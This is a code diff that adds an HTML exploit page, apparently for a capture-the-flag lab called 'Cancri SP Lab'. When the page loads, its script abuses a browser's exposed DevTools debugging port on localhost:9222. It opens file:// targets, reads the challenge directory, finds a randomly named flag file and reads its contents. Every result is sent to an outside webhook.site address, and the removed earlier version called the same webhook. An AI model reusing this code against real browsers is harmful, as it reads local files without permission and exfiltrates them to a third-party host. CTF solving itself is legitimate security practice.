@@ -1,66 +1,111 @@
-<script>
-const webhook =
-  "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-async function report(stage, details = {}) {
-  const data = JSON.stringify({
-    stage,
-    details,
-    time: new Date().toISOString()
-  });
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Cancri SP Lab</title>
+</head>
+<body>
+  <h1>Cancri SP Lab</h1>
+  <pre id="status">Waiting for challenge browser...</pre>
 
-  document.getElementById("status").textContent +=
-    "\n" + data;
+  <script>
+    const HOOK =
+      "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-  try {
-    await fetch(webhook, {
-      method: "POST",
-      mode: "no-cors",
-      headers: {
-        "Content-Type": "text/plain"
-      },
-      body: data
-    });
-  } catch (e) {
-    console.error(e);
-  }
-}
+    function report(stage, data) {
+      const body = JSON.stringify({
+        stage: stage,
+        data: data,
+        time: new Date().toISOString()
+      });
 
-async function run() {
-  await report("page_loaded", {
-    url: location.href,
-    userAgent: navigator.userAgent
-  });
+      navigator.sendBeacon(HOOK, body);
+      document.getElementById("status").textContent =
+        stage + ": " + String(data).slice(0, 500);
+    }
 
-  try {
-    await report("before_cdp_fetch");
+    const sleep = ms =>
+      new Promise(resolve => setTimeout(resolve, ms));
 
-    const controller = new AbortController();
-    const timeout = setTimeout(
-      () => controller.abort(), 4000
-    );
+    async function openAndRead(fileUrl) {
+      const response = await fetch(
+        "http://localhost:9222/json/new?" + fileUrl,
+        { method: "PUT" }
+      );
 
-    const response = await fetch(
-      "http://localhost:9222/json/version",
-      {
-        signal: controller.signal
+      const target = await response.json();
+      report("cdp_target", target);
+
+      const ws = new WebSocket(target.webSocketDebuggerUrl);
+
+      return await new Promise((resolve, reject) => {
+        const timer = setTimeout(() => {
+          ws.close();
+          reject(new Error("CDP response timeout"));
+        }, 8000);
+
+        ws.onerror = () => {
+          clearTimeout(timer);
+          reject(new Error("CDP WebSocket error"));
+        };
+
+        ws.onopen = async () => {
+          await sleep(300);
+          ws.send(JSON.stringify({
+            id: 1,
+            method: "Runtime.evaluate",
+            params: {
+              expression: "document.documentElement.innerHTML",
+              returnByValue: true
+            }
+          }));
+        };
+
+        ws.onmessage = event => {
+          const msg = JSON.parse(event.data);
+
+          if (msg.id === 1) {
+            clearTimeout(timer);
+            ws.close();
+
+            if (msg.error) {
+              reject(new Error(JSON.stringify(msg.error)));
+            } else {
+              resolve(msg.result.result.value || "");
+            }
+          }
+        };
+      });
+    }
+
+    (async () => {
+      try {
+        report("started", location.href);
+
+        // First try to enumerate the challenge directory.
+        const listing = await openAndRead("file:///challenge/");
+        report("directory_listing", listing);
+
+        // Find the randomly named flag file.
+        const match = listing.match(/flag-[a-f0-9]{32}/i);
+
+        if (!match) {
+          report("flag_filename_not_found", listing);
+          return;
+        }
+
+        const flagPath = "file:///challenge/" + match[0];
+        report("flag_path_found", flagPath);
+
+        // Open the flag file in a new Chrome target.
+        const flagContent = await openAndRead(flagPath);
+        report("FLAG_CONTENT", flagContent);
+
+      } catch (e) {
+        report("error", e.stack || e.message || String(e));
       }
-    );
-
-    clearTimeout(timeout);
-
-    await report("cdp_response", {
-      status: response.status,
-      body: await response.text()
-    });
-
-  } catch (e) {
-    await report("cdp_error", {
-      name: e.name,
-      message: e.message
-    });
-  }
-}
-
-run();
-</script>
+    })();
+  </script>
+</body>
+</html>
